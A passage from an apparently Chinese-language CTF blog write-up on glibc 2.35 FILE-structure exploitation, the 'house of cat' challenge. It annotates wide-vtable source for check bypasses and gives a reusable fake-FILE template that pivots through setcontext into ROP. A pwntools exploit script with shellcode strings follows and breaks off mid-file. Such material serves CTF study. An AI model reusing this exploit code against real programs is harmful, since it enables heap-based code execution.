class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *_<span class="title">wide_vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_wfile_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_new_file_finish),</span><br><span class="line">  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),</span><br><span class="line">  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow),</span><br><span class="line">  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_wfile_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_file_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_wfile_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_new_file_setbuf),</span><br><span class="line">  JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_wfile_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_file_read),</span><br><span class="line">  JUMP_INIT(write, _IO_new_file_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_file_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_file_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_file_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br><span class="line">libc_hidden_data_def (_IO_wfile_jumps)</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_wfile_jumps_mmap</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_new_file_finish),</span><br><span class="line">  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),</span><br><span class="line">  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow_mmap),</span><br><span class="line">  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_wfile_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_file_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_wfile_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_file_setbuf_mmap),</span><br><span class="line">  JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_wfile_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_file_read),</span><br><span class="line">  JUMP_INIT(write, _IO_new_file_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_file_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_file_close_mmap),</span><br><span class="line">  JUMP_INIT(stat, _IO_file_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h4 id="利用-IO-wfile-overflow函数"><a href="#利用-IO-wfile-overflow函数" class="headerlink" title="利用_IO_wfile_overflow函数"></a>利用<code>_IO_wfile_overflow</code>函数</h4><p>先看一下相关源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">wint_t</span></span><br><span class="line">_IO_wfile_overflow (FILE *f, <span class="type">wint_t</span> wch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span>	<span class="comment">// 绕过检查</span></span><br><span class="line"><span class="comment">// #define _IO_NO_WRITES         0x0008 /* Writing not allowed.  */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span>)		<span class="comment">// 绕过检查进入函数</span></span><br><span class="line"><span class="comment">// #define _IO_CURRENTLY_PUTTING 0x0800</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_write_base == <span class="number">0</span>)		<span class="comment">// 绕过检查进入函数</span></span><br><span class="line">	&#123;</span><br><span class="line">	  _IO_wdoallocbuf (f);		<span class="comment">// 利用点</span></span><br><span class="line">	  _IO_free_wbackup_area (f);</span><br><span class="line">	  _IO_wsetg (f, f-&gt;_wide_data-&gt;_IO_buf_base,</span><br><span class="line">		     f-&gt;_wide_data-&gt;_IO_buf_base, f-&gt;_wide_data-&gt;_IO_buf_base);</span><br><span class="line">          ......</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line">_IO_wdoallocbuf (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base)		<span class="comment">// 绕过检查</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))	<span class="comment">// 绕过检查</span></span><br><span class="line"><span class="comment">// #define _IO_UNBUFFERED        0x0002</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WDOALLOCATE (fp) != WEOF)	<span class="comment">// 利用点</span></span><br><span class="line"><span class="comment">// 总结下来就是 *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  _IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf,</span><br><span class="line">		     fp-&gt;_wide_data-&gt;_shortbuf + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>核心利用点和绕过都总结如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_flags 设置为<span class="number">0</span>即可</span><br><span class="line">fp-&gt;_wide_data-&gt;_IO_write_base == <span class="literal">NULL</span></span><br><span class="line">fp-&gt;_wide_data-&gt;_IO_buf_base == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line">*(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x68</span>)(fp)</span><br></pre></td></tr></table></figure>

<p>调用链：<code>_IO_wfile_overflow -&gt; _IO_wdoallocbuf -&gt; _IO_WDOALLOCATE -&gt; *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)</code></p>
<h4 id="利用-IO-wfile-underflow-mmap函数"><a href="#利用-IO-wfile-underflow-mmap函数" class="headerlink" title="利用_IO_wfile_underflow_mmap函数"></a>利用<code>_IO_wfile_underflow_mmap</code>函数</h4><p>先看一下相关源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">wint_t</span></span><br><span class="line">_IO_wfile_underflow_mmap (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cd</span>;</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *read_stop;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))		<span class="comment">// 绕过检查</span></span><br><span class="line"><span class="comment">// #define _IO_NO_READS          0x0004 /* Reading not allowed.  */</span></span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)	<span class="comment">// 绕过检查</span></span><br><span class="line">    <span class="keyword">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  cd = fp-&gt;_codecvt;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Maybe there is something left in the external buffer.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &gt;= fp-&gt;_IO_read_end</span><br><span class="line">      <span class="comment">/* No.  But maybe the read buffer is not fully set up.  */</span></span><br><span class="line">      &amp;&amp; _IO_file_underflow_mmap (fp) == EOF)		<span class="comment">// 绕过检查</span></span><br><span class="line">    <span class="comment">/* Nothing available.  _IO_file_underflow_mmap has set the EOF or error</span></span><br><span class="line"><span class="comment">       flags as appropriate.  */</span></span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* There is more in the external.  Convert it.  */</span></span><br><span class="line">  read_stop = (<span class="type">const</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base == <span class="literal">NULL</span>)		<span class="comment">// 绕过检查进入函数</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_save_base != <span class="literal">NULL</span>)	<span class="comment">// 视情况绕过</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="built_in">free</span> (fp-&gt;_wide_data-&gt;_IO_save_base);		<span class="comment">// 存在free可利用</span></span><br><span class="line">	  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">	&#125;</span><br><span class="line">      _IO_wdoallocbuf (fp);		<span class="comment">// 关键函数</span></span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line">_IO_wdoallocbuf (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base)		<span class="comment">// 绕过检查</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))	<span class="comment">// 绕过检查</span></span><br><span class="line"><span class="comment">// #define _IO_UNBUFFERED        0x0002</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WDOALLOCATE (fp) != WEOF)	<span class="comment">// 利用点</span></span><br><span class="line"><span class="comment">// 总结下来就是 *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  _IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf,</span><br><span class="line">		     fp-&gt;_wide_data-&gt;_shortbuf + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>核心利用点和绕过都总结如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_flags 设置为0即可</span><br><span class="line">fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end</span><br><span class="line">fp-&gt;_wide_data-&gt;_IO_buf_base == NULL</span><br><span class="line">fp-&gt;_wide_data-&gt;_IO_read_ptr &gt;= fp-&gt;_wide_data-&gt;_IO_read_end</span><br><span class="line">视情况选择：</span><br><span class="line">- fp-&gt;_wide_data-&gt;_IO_save_base == NULL</span><br><span class="line">- free (fp-&gt;_wide_data-&gt;_IO_save_base) -&gt; fp-&gt;_wide_data-&gt;_IO_save_base 合法被free的地址</span><br><span class="line"></span><br><span class="line">*(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)</span><br></pre></td></tr></table></figure>

<p>调用链：<code>_IO_wfile_underflow_mmap -&gt; _IO_wdoallocbuf -&gt; _IO_WDOALLOCATE -&gt; *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)</code></p>
<h3 id="house-of-cat-强网2022"><a href="#house-of-cat-强网2022" class="headerlink" title="house_of_cat(强网2022)"></a>house_of_cat(强网2022)</h3><p>2.35的堆题，在正式进入堆操作之前有个检查，稍微逆一下就可以出来了，程序只有两次edit的机会，没有退出和main函数返回，所以我们只能通过断言触发IO漏洞，那么两次的edit分别将用于laregbin_attack和修改top_chunk的size。</p>
<p>程序开启了一个特别的sandbox，分析下来在进行read的时候fd要是0才能绕过沙盒，所以我们在open之前可以先<code>close(0)</code>，如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x10 0xc000003e  if (A != ARCH_X86_64) goto 0018</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x0d 0xffffffff  if (A != 0xffffffff) goto 0018</span><br><span class="line"> 0005: 0x15 0x0b 0x00 0x0000013e  if (A == getrandom) goto 0017</span><br><span class="line"> 0006: 0x15 0x0a 0x00 0x00000002  if (A == open) goto 0017</span><br><span class="line"> 0007: 0x15 0x09 0x00 0x00000003  if (A == close) goto 0017</span><br><span class="line"> 0008: 0x15 0x08 0x00 0x00000009  if (A == mmap) goto 0017</span><br><span class="line"> 0009: 0x15 0x07 0x00 0x0000000c  if (A == brk) goto 0017</span><br><span class="line"> 0010: 0x15 0x06 0x00 0x000000e7  if (A == exit_group) goto 0017</span><br><span class="line"> 0011: 0x15 0x00 0x04 0x00000000  if (A != read) goto 0016</span><br><span class="line"> 0012: 0x20 0x00 0x00 0x00000014  A = fd &gt;&gt; 32 # read(fd, buf, count)</span><br><span class="line"> 0013: 0x15 0x00 0x04 0x00000000  if (A != 0x0) goto 0018</span><br><span class="line"> 0014: 0x20 0x00 0x00 0x00000010  A = fd # read(fd, buf, count)</span><br><span class="line"> 0015: 0x15 0x01 0x02 0x00000000  if (A == 0x0) goto 0017 else goto 0018</span><br><span class="line"> 0016: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0018</span><br><span class="line"> 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0018: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>

<p>这里用的是<code>_IO_wfile_overflow</code>函数，通过调试发现在执行到<code>setcontext + 61</code>的时候，rdx寄存器保存着我们伪造的<code>_IO_wide_data</code>结构体的首地址，而采用<code>_IO_wfile_underflow_mmap</code>函数执行到<code>setcontext + 61</code>的时候，rdx寄存器只保存了chunk的size，可能需要我们利用一些通用的gadget来纠正rdx的值，所以会比较麻烦。</p>
<p>还有一点，为什么这里要采用<code>IO_wfile_jumps - 0x20</code>呢？因为原本程序是调用<code>xsputn</code>去打印断言信息，且其和<code>_IO_wfile_overflow</code>函数相距0x20字节，所以这样修改偏移，如果希望调用<code>_IO_wfile_underflow_mmap</code>那么只需要将偏移修改成0x18就好。</p>
<p>把IO构造的部分拿出来可以当作模板：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># _flags = prev_size = 0</span></span><br><span class="line"><span class="comment"># _IO_read_ptr</span></span><br><span class="line">fake_file1 = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x78</span></span><br><span class="line">fake_file1 += p64(heap_base)     <span class="comment"># _lock</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file1 += p64(heap_base + <span class="number">0x290</span> + <span class="number">0x100</span>)    <span class="comment"># _wide_data</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0xc8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file1 += p64(IO_wfile_jumps - <span class="number">0x20</span>)      <span class="comment"># vtable</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0x100</span> - <span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_wide = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x68</span></span><br><span class="line">fake_wide += p64(setcontext_61)     <span class="comment"># _wide_vtable + 0x68</span></span><br><span class="line">fake_wide = fake_wide.ljust(<span class="number">0xa0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_wide += p64(heap_base + <span class="number">0x1c90</span>)    <span class="comment"># rsp -&gt; orw_addr</span></span><br><span class="line">fake_wide += p64(p_rdi_r + <span class="number">1</span>)       <span class="comment"># rip -&gt; ret</span></span><br><span class="line">fake_wide = fake_wide.ljust(<span class="number">0xe0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_wide += p64(heap_base + <span class="number">0x290</span> + <span class="number">0x100</span>)     <span class="comment"># _wide_vtable</span></span><br><span class="line"></span><br><span class="line">fake_file1 += fake_wide</span><br></pre></td></tr></table></figure>

<p>WP如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line"><span class="comment"># context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)</span></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./ld.so&quot;</span>, <span class="string">b&quot;./pwn&quot;</span>], env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./house_of_cat&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote(ip, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./house_of_cat&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">lgl     = <span class="keyword">lambda</span> s, value           :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, value))</span><br><span class="line"></span><br><span class="line">sh_x86_18=<span class="string">&quot;\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x86_20=<span class="string">&quot;\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x64_21=<span 